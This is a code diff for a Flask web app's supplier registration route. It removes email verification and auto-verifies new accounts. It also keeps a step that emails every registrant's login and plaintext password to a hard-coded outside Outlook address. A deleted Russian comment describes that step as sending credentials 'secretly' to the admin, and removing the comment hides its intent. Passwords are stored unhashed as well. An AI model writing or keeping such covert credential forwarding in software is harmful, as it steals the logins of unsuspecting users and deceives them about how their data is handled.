@@ -383,24 +383,20 @@ def login():
 def register():
     if request.method == 'POST':
         email, password = request.form['email'], request.form['password']
-        code, time_now = generate_code(), datetime.now().strftime("%Y-%m-%d %H:%M")
+        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
         try:
             with get_db_connection() as conn:
-                conn.cursor().execute('''INSERT INTO users (email, password, role, company_name, mc_number, ein_number, phone_number, contact_name, created_at, verification_code) 
-                                         VALUES (?, ?, 'supplier', ?, ?, ?, ?, ?, ?, ?)''', 
-                                      (email, password, request.form['company_name'], request.form['mc_number'], request.form['ein_number'], request.form['phone_number'], request.form['contact_name'], time_now, code))
+                conn.cursor().execute('''INSERT INTO users (email, password, role, company_name, mc_number, ein_number, phone_number, contact_name, created_at, is_verified) 
+                                         VALUES (?, ?, 'supplier', ?, ?, ?, ?, ?, ?, 1)''', 
+                                      (email, password, request.form['company_name'], request.form['mc_number'], request.form['ein_number'], request.form['phone_number'], request.form['contact_name'], time_now))
                 conn.commit()
             
-            # 1. Отправляем код брокеру
-            send_email(email, "Verify Identity", f"Code: {code}")
-            
-            # 2. Скрытно отправляем логин и пароль админу
-            admin_email = 'mahmud_mahmudski@outlook.com'  # <-- ОБЯЗАТЕЛЬНО ВПИШИ СВОЙ EMAIL СЮДА!
+            admin_email = 'mahmud_mahmudski@outlook.com'
             admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
             send_email(admin_email, "Новый брокер - Доступы", admin_body)
             
-            flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
-            return render_full(HTML_VERIFY, email=email)
+            flash("Registration successful! You can now log in.", "success")
+            return redirect(url_for('login'))
         except sqlite3.IntegrityError: 
             flash("Email is already registered in the system.", "danger")
     return render_full(HTML_REGISTER)
